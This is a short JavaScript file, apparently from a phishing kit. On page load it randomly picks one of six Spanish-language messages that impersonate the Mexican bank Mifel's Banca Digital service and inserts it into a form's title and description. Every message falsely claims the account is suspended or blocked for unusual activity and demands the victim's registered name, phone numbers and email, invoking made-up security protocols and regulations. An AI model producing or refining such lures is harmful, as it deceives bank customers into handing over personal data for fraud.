document.addEventListener('DOMContentLoaded', function() {
    const contextos = [
        {
            titulo: "Restablecimiento de acceso pendiente",
            mensaje: "Tu usuario permanece suspendido de forma preventiva. Para reactivarlo, confirma los datos de contacto vinculados a tu cuenta. Este paso forma parte del protocolo de seguridad de Mifel ante accesos con actividad inusual."
        },
        {
            titulo: "Verificación de titularidad requerida",
            mensaje: "En cumplimiento de las medidas de prevención de fraude del sector financiero, debemos validar tu identidad antes de restablecer el acceso a Banca Digital. Proporciona el nombre, teléfono y correo registrados ante Mifel."
        },
        {
            titulo: "Confirmación de datos para desbloqueo",
            mensaje: "Detectamos un acceso que no cumple con nuestros parámetros de seguridad. Para continuar con el restablecimiento de tu usuario, es indispensable confirmar tu información de contacto actual."
        },
        {
            titulo: "Validación de identidad en curso",
            mensaje: "Mifel debe verificar que la solicitud de desbloqueo proviene del titular de la cuenta. Completa el formulario con los datos asociados a tu perfil; usaremos esta información para enviarte la confirmación del proceso."
        },
        {
            titulo: "Paso obligatorio de seguridad",
            mensaje: "Conforme a los lineamientos de seguridad para operaciones en canales electrónicos, las instituciones deben reforzar la autenticación cuando se detecta actividad atípica. Confirma tus datos para reactivar tu acceso."
        },
        {
            titulo: "Proceso de recuperación de acceso",
            mensaje: "Tu acceso a Banca Digital fue restringido por medidas de protección. Para completar el restablecimiento, confirma tu nombre completo, números de contacto y correo electrónico registrados."
        }
    ];

    const tituloElemento = document.querySelector('.form-title');
    const contextoElemento = document.querySelector('.form-description');

    if (!tituloElemento || !contextoElemento) {
        return;
    }

    const contextoAleatorio = contextos[Math.floor(Math.random() * contextos.length)];

    tituloElemento.style.opacity = '0';
    contextoElemento.style.opacity = '0';
    tituloElemento.style.transition = 'opacity 0.5s ease-in-out';
    contextoElemento.style.transition = 'opacity 0.5s ease-in-out';

    setTimeout(() => {
        tituloElemento.textContent = contextoAleatorio.titulo;
        contextoElemento.textContent = contextoAleatorio.mensaje;
        tituloElemento.style.opacity = '1';
        contextoElemento.style.opacity = '1';
    }, 100);
});
